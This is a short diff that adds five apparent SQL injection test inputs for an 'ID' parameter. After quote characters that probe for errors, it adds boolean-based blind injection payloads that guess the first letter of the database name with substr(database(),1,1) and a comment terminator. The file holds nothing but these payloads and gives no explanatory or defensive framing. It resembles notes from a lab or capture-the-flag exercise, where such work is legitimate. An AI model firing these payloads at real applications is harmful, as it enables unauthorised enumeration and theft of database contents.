@@ -1,0 +1,5 @@
+ID:1
+ID:1'
+ID:1"
+ID:1" and substr(database(),1,1)="s"-- 
+ID:1" and substr(database(),1,1)="a"-- 
